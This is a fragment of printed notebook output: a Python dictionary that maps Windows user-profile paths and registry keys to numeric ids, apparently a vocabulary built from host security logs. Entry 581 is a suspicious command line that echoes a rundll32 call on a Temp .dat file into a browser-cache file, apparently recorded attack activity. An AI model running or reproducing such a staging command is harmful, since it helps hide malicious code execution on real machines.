       " 'C:\\\\Users\\\\omcfarland\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\22.055.0313.0001\\\\ur\\\\*': 445,\n",
       " 'C:\\\\Users\\\\davidsmith\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\aapocclcgogkmnckokdopfmhonfmgoek\\\\0.10_0\\\\_locales\\\\pt_PT': 446,\n",
       " 'C:\\\\Users\\\\chadhicks\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.CredDialogHost_cw5n1h2txyewy\\\\AC\\\\Temp\\\\.git': 447,\n",
       " 'C:\\\\Users\\\\nolandennis\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Sync Data': 448,\n",
       " 'C:\\\\Users\\\\bakerrenee\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\apdfllckaahabafndbhieahigkjlhalf\\\\14.5_0\\\\_locales\\\\uk': 449,\n",
       " 'C:\\\\Users\\\\nolandennis\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.NET.Native.Framework.2.2_8wekyb3d8bbwe\\\\AC\\\\INetCache': 450,\n",
       " 'C:\\\\Users\\\\natalie04\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.WindowsStore_8wekyb3d8bbwe\\\\LocalCache\\\\.git': 451,\n",
       " 'C:\\\\Users\\\\sanchezmatthew\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.BioEnrollment_cw5n1h2txyewy\\\\RoamingState\\\\*': 452,\n",
       " 'C:\\\\Users\\\\hmarsh\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\ghbmnnjooekpmoecnnnilnnbdlolhkhi\\\\1.41.0_0\\\\_locales\\\\ca': 453,\n",
       " 'C:\\\\Users\\\\james97\\\\AppData\\\\Local\\\\Temp\\\\MozillaBackgroundTask-308046B0AF4A39CB-backgroundupdate-2\\\\crashes\\\\.git': 454,\n",
       " 'C:\\\\Users\\\\stephaniewood\\\\AppData\\\\Local\\\\Microsoft\\\\input\\\\bg-BG\\\\*': 455,\n",
       " 'C:\\\\Users\\\\james97\\\\AppData\\\\Local\\\\Packages\\\\E2A4F912-2574-4A75-9BB0-0D023378592B_cw5n1h2txyewy\\\\AC\\\\INetCache\\\\*': 456,\n",
       " 'C:\\\\Users\\\\jessicajacobson\\\\AppData\\\\Local\\\\Microsoft\\\\input\\\\ar-OM\\\\.git': 457,\n",
       " 'C:\\\\Users\\\\angela76\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.ZuneVideo_8wekyb3d8bbwe\\\\LocalState\\\\*': 458,\n",
       " 'C:\\\\Users\\\\wendyroberts\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\aapocclcgogkmnckokdopfmhonfmgoek\\\\0.10_0\\\\_locales\\\\he\\\\*': 459,\n",
       " 'C:\\\\Users\\\\amanda90\\\\AppData\\\\Local\\\\Google\\\\.git': 460,\n",
       " 'C:\\\\Users\\\\nicholas35\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\apdfllckaahabafndbhieahigkjlhalf\\\\14.5_0\\\\.git': 461,\n",
       " 'C:\\\\Users\\\\annetteyoung\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.YourPhone_8wekyb3d8bbwe\\\\LocalCache\\\\Roaming\\\\Microsoft\\\\Windows\\\\Start Menu\\\\.git': 462,\n",
       " 'C:\\\\Users\\\\yjones\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.WindowsSoundRecorder_8wekyb3d8bbwe\\\\LocalCache\\\\*': 463,\n",
       " 'C:\\\\Users\\\\ricky35\\\\AppData\\\\Local\\\\Microsoft\\\\Media Player\\\\.git': 464,\n",
       " 'C:\\\\Users\\\\richard97\\\\AppData\\\\Roaming\\\\Mozilla\\\\Firefox\\\\Crash Reports\\\\*': 465,\n",
       " 'C:\\\\Users\\\\perezkenneth\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\nmmhkkegccagdldgiimedpiccmgmieda\\\\1.0.0.6_0\\\\_locales\\\\en': 466,\n",
       " 'C:\\\\Users\\\\client1\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.MicrosoftOfficeHub_8wekyb3d8bbwe\\\\AC\\\\Microsoft\\\\Internet Explorer\\\\DOMStore\\\\A80FBT22\\\\.git': 467,\n",
       " 'C:\\\\Users\\\\fitzgeraldleslie\\\\AppData\\\\Roaming\\\\Mozilla\\\\Firefox\\\\Profiles\\\\wfxwaomf.default-release\\\\datareporting\\\\archived\\\\.git': 468,\n",
       " 'C:\\\\Users\\\\bmoore\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.NET.Native.Framework.2.2_8wekyb3d8bbwe\\\\AC\\\\*': 469,\n",
       " 'C:\\\\Users\\\\julie68\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.VCLibs.140.00_8wekyb3d8bbwe\\\\AC\\\\*': 470,\n",
       " 'C:\\\\Users\\\\psimmons\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.AssignedAccessLockApp_cw5n1h2txyewy\\\\LocalCache': 471,\n",
       " 'C:\\\\Users\\\\jenniferbaxter\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\ghbmnnjooekpmoecnnnilnnbdlolhkhi\\\\1.41.0_0\\\\_locales\\\\is\\\\*': 472,\n",
       " 'C:\\\\Users\\\\mariahwilson\\\\Contacts\\\\.git': 473,\n",
       " 'C:\\\\Users\\\\evan17\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.VP9VideoExtensions_8wekyb3d8bbwe\\\\AC\\\\INetCookies\\\\.git': 474,\n",
       " 'C:\\\\Users\\\\elizabethgoodman\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.MicrosoftEdge.Stable_8wekyb3d8bbwe\\\\Settings': 475,\n",
       " 'C:\\\\Users\\\\mitchellteresa\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\Network Shortcuts\\\\*': 476,\n",
       " 'C:\\\\Users\\\\griffithjohn\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.YourPhone_8wekyb3d8bbwe\\\\AC\\\\INetHistory\\\\.git': 477,\n",
       " 'C:\\\\Users\\\\yjones\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Xbox.TCUI_8wekyb3d8bbwe\\\\*': 478,\n",
       " 'C:\\\\Users\\\\sanchezmatthew\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Local Storage\\\\leveldb': 479,\n",
       " 'C:\\\\Users\\\\nolandennis\\\\AppData\\\\Local\\\\Microsoft\\\\PlayReady\\\\Internet Explorer\\\\InPrivate\\\\.git': 480,\n",
       " 'C:\\\\Users\\\\stephaniewood\\\\AppData\\\\Local\\\\Packages\\\\E2A4F912-2574-4A75-9BB0-0D023378592B_cw5n1h2txyewy\\\\TempState': 481,\n",
       " 'C:\\\\Users\\\\jacobsmith\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.XGpuEjectDialog_cw5n1h2txyewy\\\\AC\\\\INetCookies\\\\*': 482,\n",
       " 'C:\\\\Users\\\\brucegriffin\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.MicrosoftSolitaireCollection_8wekyb3d8bbwe\\\\Settings\\\\.git': 483,\n",
       " 'C:\\\\Users\\\\annetteyoung\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.ECApp_8wekyb3d8bbwe\\\\AC\\\\INetHistory\\\\*': 484,\n",
       " 'C:\\\\Users\\\\chadhicks\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\22.055.0313.0001\\\\LogoImages': 485,\n",
       " 'C:\\\\Users\\\\faulkneramy\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.NET.Native.Runtime.1.7_8wekyb3d8bbwe\\\\AC\\\\Temp\\\\*': 486,\n",
       " 'C:\\\\Users\\\\natalie04\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.Search_cw5n1h2txyewy\\\\AC\\\\INetHistory\\\\BackgroundTransferApiGroup\\\\.git': 487,\n",
       " 'C:\\\\Users\\\\nicholas37\\\\AppData\\\\Roaming\\\\Mozilla\\\\Extensions': 488,\n",
       " 'C:\\\\Users\\\\harristheresa\\\\AppData\\\\Local\\\\Microsoft\\\\Windows\\\\CloudStore\\\\.git': 489,\n",
       " 'HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Explorer\\\\FolderDescriptions\\\\{A990AE9F-A03B-4e80-94BC-9912D7504104}\\\\DefinitionFlags': 490,\n",
       " 'C:\\\\Users\\\\meaganaustin\\\\AppData\\\\Local\\\\Microsoft\\\\Windows Sidebar\\\\Gadgets\\\\.git': 491,\n",
       " 'C:\\\\Users\\\\anthonysheila\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Wallet_8wekyb3d8bbwe\\\\Settings\\\\.git': 492,\n",
       " 'C:\\\\Users\\\\stephaniewood\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\CloudStore\\\\*': 493,\n",
       " 'C:\\\\Users\\\\yjones\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\22.055.0313.0001\\\\af\\\\.git': 494,\n",
       " 'C:\\\\Users\\\\jonathan15\\\\Desktop\\\\Blacksmith-master\\\\Blacksmith-master\\\\templates\\\\azure\\\\Win10-AD\\\\scripts': 495,\n",
       " 'C:\\\\Users\\\\evansdaniel\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\\\\AC\\\\INetHistory\\\\*': 496,\n",
       " 'C:\\\\Users\\\\ohall\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.People_8wekyb3d8bbwe\\\\AppData\\\\*': 497,\n",
       " 'C:\\\\Users\\\\yjones\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.WindowsCalculator_8wekyb3d8bbwe\\\\AppData\\\\.git': 498,\n",
       " 'C:\\\\Users\\\\nicholas35\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.UI.Xaml.2.3_8wekyb3d8bbwe\\\\AC\\\\INetCookies': 499,\n",
       " 'C:\\\\Users\\\\kimberlyalexander\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.People_8wekyb3d8bbwe\\\\SystemAppData': 500,\n",
       " 'C:\\\\Users\\\\perezrodney\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Microsoft3DViewer_8wekyb3d8bbwe\\\\SystemAppData\\\\.git': 501,\n",
       " 'C:\\\\Users\\\\davidsmith\\\\AppData\\\\Local\\\\Microsoft\\\\Edge\\\\User Data\\\\AutoLaunchProtocolsComponent\\\\.git': 502,\n",
       " 'C:\\\\Users\\\\barnescindy\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.UI.Xaml.2.6_8wekyb3d8bbwe\\\\AC\\\\*': 503,\n",
       " 'C:\\\\Users\\\\dkelly\\\\AppData\\\\Local\\\\Temp\\\\vmware-dkelly\\\\*': 504,\n",
       " 'C:\\\\Users\\\\hmarsh\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Feature Engagement Tracker\\\\AvailabilityDB\\\\.git': 505,\n",
       " 'C:\\\\Users\\\\ricky35\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\aohghmighlieiainnegkcijnfilokake\\\\0.10_0\\\\_locales\\\\sl\\\\*': 506,\n",
       " 'C:\\\\Users\\\\pwebb\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.NET.Native.Runtime.2.2_8wekyb3d8bbwe\\\\AC\\\\INetCache\\\\*': 507,\n",
       " 'C:\\\\Users\\\\jacobsmith\\\\AppData\\\\Local\\\\Microsoft\\\\Windows\\\\WinX\\\\Group2\\\\.git': 508,\n",
       " 'C:\\\\Users\\\\ricky35\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\Update\\\\*': 509,\n",
       " 'C:\\\\Users\\\\ndalton\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Storage\\\\ext\\\\gfdkimpbcpahaombhbimeihdjnejgicl\\\\def\\\\Code Cache\\\\js\\\\.git': 510,\n",
       " 'C:\\\\Users\\\\john95\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.GetHelp_8wekyb3d8bbwe\\\\Settings': 511,\n",
       " 'C:\\\\Users\\\\desireesantana\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.MSPaint_8wekyb3d8bbwe\\\\RoamingState\\\\.git': 512,\n",
       " 'C:\\\\Users\\\\hmarsh\\\\AppData\\\\Local\\\\Packages\\\\microsoft.windowscommunicationsapps_8wekyb3d8bbwe\\\\LocalCache\\\\*': 513,\n",
       " 'HKCR\\\\CLSID\\\\{06EEE834-461C-42c2-8DCF-1502B527B1F9}\\\\InProcServer32\\\\ThreadingModel': 514,\n",
       " 'C:\\\\Users\\\\ohall\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Win32WebViewHost_cw5n1h2txyewy\\\\LocalState': 515,\n",
       " 'C:\\\\Users\\\\nicholas37\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Storage\\\\ext\\\\gfdkimpbcpahaombhbimeihdjnejgicl\\\\def\\\\GPUCache': 516,\n",
       " 'C:\\\\Users\\\\nicholas37\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.ScreenSketch_8wekyb3d8bbwe\\\\LocalState': 517,\n",
       " 'C:\\\\Users\\\\perezkenneth\\\\Searches': 518,\n",
       " 'C:\\\\Users\\\\ndalton\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\pjkljhegncpnkpknbcohdijeoejaedia\\\\8.3_0\\\\_locales\\\\sl': 519,\n",
       " 'C:\\\\Users\\\\ngray\\\\AppData\\\\Local\\\\Microsoft\\\\Edge\\\\User Data\\\\Crashpad': 520,\n",
       " 'C:\\\\Users\\\\ijohnson\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\22.055.0313.0001\\\\adm\\\\fr': 521,\n",
       " 'C:\\\\Users\\\\nolandennis\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.LockApp_cw5n1h2txyewy\\\\AC\\\\INetHistory': 522,\n",
       " 'C:\\\\Users\\\\nsilva\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\ZxcvbnData': 523,\n",
       " 'C:\\\\Users\\\\nolandennis\\\\AppData\\\\Local\\\\Packages\\\\windows.immersivecontrolpanel_cw5n1h2txyewy\\\\.git': 524,\n",
       " 'C:\\\\Users\\\\skoch\\\\AppData\\\\Local\\\\Microsoft\\\\input\\\\nl-BE\\\\*': 525,\n",
       " 'C:\\\\Users\\\\jonathan15\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.Search_cw5n1h2txyewy\\\\LocalState\\\\ConstraintIndex\\\\Settings_{f6d48b37-97d2-4998-9557-38e97993d384}\\\\.git': 526,\n",
       " 'C:\\\\Users\\\\ijohnson\\\\AppData\\\\Local\\\\Microsoft\\\\Feeds Cache': 527,\n",
       " 'C:\\\\Users\\\\julie68\\\\AppData\\\\Local\\\\Microsoft\\\\Edge\\\\User Data\\\\Default\\\\Code Cache\\\\js\\\\*': 528,\n",
       " 'C:\\\\Users\\\\fitzgeraldleslie\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\apdfllckaahabafndbhieahigkjlhalf\\\\14.5_0\\\\_locales\\\\zh_TW\\\\*': 529,\n",
       " 'C:\\\\Windows\\\\assembly\\\\NativeImages_v4.0.30319_64\\\\System.Core\\\\dbf675a2e7564fd29ec8b82b29a1a2fe\\\\System.Core.ni.dll.aux': 530,\n",
       " 'C:\\\\Users\\\\omcfarland\\\\AppData\\\\Roaming\\\\Microsoft\\\\SystemCertificates': 531,\n",
       " 'C:\\\\Users\\\\desireesantana\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.MicrosoftEdge.Stable_8wekyb3d8bbwe\\\\SystemAppData\\\\*': 532,\n",
       " 'HKLM\\\\HARDWARE\\\\DEVICEMAP\\\\VIDEO\\\\MaxObjectNumber': 533,\n",
       " 'C:\\\\Users\\\\fgarrison\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Accessories': 534,\n",
       " 'C:\\\\Users\\\\jacobsmith\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.MicrosoftSolitaireCollection_8wekyb3d8bbwe\\\\Settings': 535,\n",
       " 'C:\\\\Users\\\\wayneanderson\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.XGpuEjectDialog_cw5n1h2txyewy\\\\AC\\\\INetCookies\\\\*': 536,\n",
       " 'C:\\\\Users\\\\sarahchandler\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\blpcfgokakmgnkcojhhkbfbldkacnbeo\\\\4.2.8_0\\\\_locales\\\\bg\\\\.git': 537,\n",
       " 'C:\\\\Users\\\\jacob97\\\\AppData\\\\Local\\\\Microsoft\\\\input\\\\fr-029\\\\*': 538,\n",
       " 'C:\\\\Users\\\\heatherhoward\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.MSPaint_8wekyb3d8bbwe\\\\AppData\\\\.git': 539,\n",
       " 'C:\\\\Users\\\\nolandennis\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Storage\\\\ext\\\\gfdkimpbcpahaombhbimeihdjnejgicl\\\\def\\\\Code Cache\\\\wasm\\\\*': 540,\n",
       " 'C:\\\\Users\\\\lanealbert\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.UI.Xaml.2.0_8wekyb3d8bbwe\\\\AC\\\\INetCache\\\\.git': 541,\n",
       " 'C:\\\\Users\\\\client1\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.XGpuEjectDialog_cw5n1h2txyewy\\\\AC\\\\Temp\\\\*': 542,\n",
       " 'C:\\\\Users\\\\james97\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.ZuneMusic_8wekyb3d8bbwe\\\\AC\\\\INetCache\\\\*': 543,\n",
       " 'C:\\\\Users\\\\meganmaldonado\\\\AppData\\\\Local\\\\Microsoft\\\\input\\\\ar-SY\\\\*': 544,\n",
       " 'C:\\\\Users\\\\david67\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.NarratorQuickStart_8wekyb3d8bbwe\\\\LocalState': 545,\n",
       " 'C:\\\\Users\\\\annetteyoung\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.WindowsCamera_8wekyb3d8bbwe\\\\AC\\\\Temp': 546,\n",
       " 'HKCU\\\\Software\\\\Classes\\\\Local Settings\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\AppModel\\\\Repository\\\\Packages\\\\Microsoft.WindowsFeedbackHub_1.2106.1801.0_x64__8wekyb3d8bbwe\\\\App\\\\Capabilities': 547,\n",
       " 'C:\\\\Users\\\\mariahwilson\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.NarratorQuickStart_8wekyb3d8bbwe\\\\AppData\\\\*': 548,\n",
       " 'C:\\\\Users\\\\ohall\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.GetHelp_8wekyb3d8bbwe\\\\AC\\\\INetCookies\\\\.git': 549,\n",
       " 'C:\\\\Users\\\\wendyroberts\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.NET.Native.Runtime.2.2_8wekyb3d8bbwe\\\\AC': 550,\n",
       " 'C:\\\\Users\\\\sanchezmatthew\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.NET.Native.Runtime.1.7_8wekyb3d8bbwe\\\\AC\\\\Temp': 551,\n",
       " 'C:\\\\Users\\\\elizabethgoodman\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.WindowsStore_8wekyb3d8bbwe\\\\LocalCache\\\\.git': 552,\n",
       " 'C:\\\\Users\\\\omcfarland\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.WebMediaExtensions_8wekyb3d8bbwe\\\\TempState\\\\.git': 553,\n",
       " 'C:\\\\Users\\\\swansontaylor\\\\AppData\\\\Local\\\\Packages\\\\Windows.CBSPreview_cw5n1h2txyewy\\\\AC\\\\INetHistory\\\\*': 554,\n",
       " 'C:\\\\Users\\\\meganmaldonado\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.XboxApp_8wekyb3d8bbwe\\\\LocalState\\\\*': 555,\n",
       " 'C:\\\\Users\\\\annetteyoung\\\\AppData\\\\Local\\\\Mozilla\\\\Firefox\\\\Profiles\\\\wfxwaomf.default-release\\\\settings\\\\main\\\\ms-language-packs\\\\browser': 556,\n",
       " 'C:\\\\Users\\\\gardnerjoseph\\\\AppData\\\\Local\\\\Microsoft\\\\input\\\\fr-LU': 557,\n",
       " 'C:\\\\Users\\\\melindapatterson\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.WindowsFeedbackHub_8wekyb3d8bbwe\\\\AC\\\\INetCookies': 558,\n",
       " 'C:\\\\Users\\\\jonathan15\\\\AppData\\\\Local\\\\Packages\\\\c5e2524a-ea46-4f67-841f-6a9465d9d515_cw5n1h2txyewy\\\\AC\\\\INetHistory\\\\.git': 559,\n",
       " 'C:\\\\Users\\\\larry44\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\apdfllckaahabafndbhieahigkjlhalf\\\\14.5_0\\\\_locales\\\\pt_BR': 560,\n",
       " 'C:\\\\Users\\\\uanderson\\\\AppData\\\\Local\\\\Packages\\\\E2A4F912-2574-4A75-9BB0-0D023378592B_cw5n1h2txyewy\\\\TempState\\\\.git': 561,\n",
       " 'C:\\\\Users\\\\leahbrown\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.Search_cw5n1h2txyewy\\\\LocalState\\\\ConstraintIndex\\\\Settings_{6f0ed44a-72bc-450e-b61d-7995493fee62}\\\\.git': 562,\n",
       " 'C:\\\\Users\\\\larry44\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.PeopleExperienceHost_cw5n1h2txyewy\\\\RoamingState': 563,\n",
       " 'C:\\\\Users\\\\melindapatterson\\\\AppData\\\\Local\\\\Microsoft\\\\Edge\\\\User Data\\\\Snapshots\\\\99.0.1150.46\\\\Default\\\\Sessions\\\\*': 564,\n",
       " 'C:\\\\Users\\\\angela76\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\ghbmnnjooekpmoecnnnilnnbdlolhkhi\\\\1.41.0_0\\\\_locales\\\\lt\\\\.git': 565,\n",
       " 'C:\\\\Users\\\\jonathan15\\\\AppData\\\\Roaming\\\\Microsoft\\\\MMC\\\\*': 566,\n",
       " 'C:\\\\Users\\\\yjones\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\22.055.0313.0001\\\\mt-MT\\\\.git': 567,\n",
       " 'C:\\\\Users\\\\hmarsh\\\\AppData\\\\Local\\\\Microsoft\\\\input\\\\fr-SN\\\\.git': 568,\n",
       " 'C:\\\\Users\\\\devon54\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\ZxcvbnData': 569,\n",
       " 'C:\\\\Users\\\\evansdaniel\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\22.055.0313.0001\\\\af': 570,\n",
       " 'C:\\\\Users\\\\james97\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\PowerShell': 571,\n",
       " 'C:\\\\Users\\\\michaelstone\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.MicrosoftEdgeDevToolsClient_8wekyb3d8bbwe\\\\LocalCache': 572,\n",
       " 'C:\\\\Users\\\\jacobsmith\\\\AppData\\\\Local\\\\Microsoft\\\\input\\\\ar-BH': 573,\n",
       " 'C:\\\\Users\\\\priscillaroberson\\\\AppData\\\\Roaming\\\\Mozilla\\\\Firefox\\\\Profiles\\\\r7js9xmv.default\\\\.git': 574,\n",
       " 'C:\\\\Users\\\\ijohnson\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\blpcfgokakmgnkcojhhkbfbldkacnbeo\\\\4.2.8_0\\\\_locales\\\\th\\\\.git': 575,\n",
       " 'C:\\\\Users\\\\victoriacole\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\\\\AC\\\\INetCache\\\\*': 576,\n",
       " 'C:\\\\Users\\\\mariahwilson\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.WindowsFeedbackHub_8wekyb3d8bbwe\\\\*': 577,\n",
       " 'C:\\\\Users\\\\swansontaylor\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.Search_cw5n1h2txyewy\\\\LocalState\\\\ConstraintIndex\\\\Settings_{f6d48b37-97d2-4998-9557-38e97993d384}\\\\.git': 578,\n",
       " 'C:\\\\Users\\\\amberhernandez\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.ParentalControls_cw5n1h2txyewy\\\\Settings': 579,\n",
       " 'C:\\\\Users\\\\david67\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.XboxGameOverlay_8wekyb3d8bbwe\\\\AC\\\\INetHistory\\\\.git': 580,\n",
       " 'echo rundll32.exe  C:\\\\Users\\\\ADMINI~1\\\\AppData\\\\Local\\\\Temp\\\\htpd.dat, bogus > C:\\\\Users\\\\user\\\\AppData\\\\Local\\\\Microsoft\\\\Windows\\\\INetCache\\\\IE\\\\WIKWAFRE\\\\f[1].txt': 581,\n",
       " 'C:\\\\Users\\\\sarahchandler\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.ParentalControls_cw5n1h2txyewy\\\\AC\\\\INetCookies': 582,\n",
       " 'C:\\\\Users\\\\victoriacole\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.MicrosoftEdgeDevToolsClient_8wekyb3d8bbwe\\\\*': 583,\n",
       " 'C:\\\\Users\\\\mariahwilson\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\nmmhkkegccagdldgiimedpiccmgmieda\\\\1.0.0.6_0\\\\_locales\\\\fi\\\\.git': 584,\n",
       " 'C:\\\\Users\\\\devon54\\\\AppData\\\\Local\\\\Microsoft\\\\input\\\\ar-AE': 585,\n",
       " 'C:\\\\Users\\\\heatherhoward\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.WindowsSoundRecorder_8wekyb3d8bbwe\\\\TempState\\\\.git': 586,\n",
       " 'C:\\\\Users\\\\nicholas37\\\\AppData\\\\Local\\\\Microsoft\\\\Windows\\\\1033': 587,\n",
       " 'C:\\\\Users\\\\brucegriffin\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\aapocclcgogkmnckokdopfmhonfmgoek\\\\0.10_0\\\\_locales\\\\lv\\\\*': 588,\n",
       " 'C:\\\\Users\\\\omcfarland\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.AssignedAccessLockApp_cw5n1h2txyewy\\\\AC\\\\INetCookies\\\\.git': 589,\n",
       " 'C:\\\\Users\\\\garypetty\\\\AppData\\\\Local\\\\Packages\\\\NcsiUwpApp_8wekyb3d8bbwe\\\\AC\\\\Temp\\\\.git': 590,\n",
       " 'C:\\\\Users\\\\annetteyoung\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.Photos_8wekyb3d8bbwe\\\\LocalState\\\\*': 591,\n",
       " 'C:\\\\Users\\\\psimmons\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Microsoft3DViewer_8wekyb3d8bbwe\\\\AC\\\\INetCache': 592,\n",
       " 'C:\\\\Users\\\\leahbrown\\\\AppData\\\\Local\\\\Mozilla\\\\Firefox\\\\Profiles\\\\*': 593,\n",
       " 'C:\\\\Users\\\\devon54\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\22.055.0313.0001\\\\hr\\\\*': 594,\n",
       " 'C:\\\\Users\\\\perezkenneth\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.Search_cw5n1h2txyewy\\\\LocalState\\\\ConstraintIndex\\\\Apps_{98de8edc-74de-4f3b-a702-e9c35c538fda}\\\\.git': 595,\n",
       " 'C:\\\\Users\\\\ijohnson\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\pjkljhegncpnkpknbcohdijeoejaedia\\\\8.3_0\\\\_locales\\\\es\\\\*': 596,\n",
       " 'C:\\\\Users\\\\swansontaylor\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.XboxGameCallableUI_cw5n1h2txyewy\\\\AC\\\\INetHistory\\\\.git': 597,\n",
       " 'C:\\\\Users\\\\dkelly\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.MicrosoftEdge.Stable_8wekyb3d8bbwe\\\\AC\\\\Temp\\\\.git': 598,\n",
       " 'C:\\\\Users\\\\psimmons\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extension Scripts': 599,\n",
       " 'C:\\\\Users\\\\victoriacole\\\\AppData\\\\Local\\\\Packages\\\\MicrosoftWindows.Client.CBS_cw5n1h2txyewy\\\\SystemAppData\\\\.git': 600,\n",
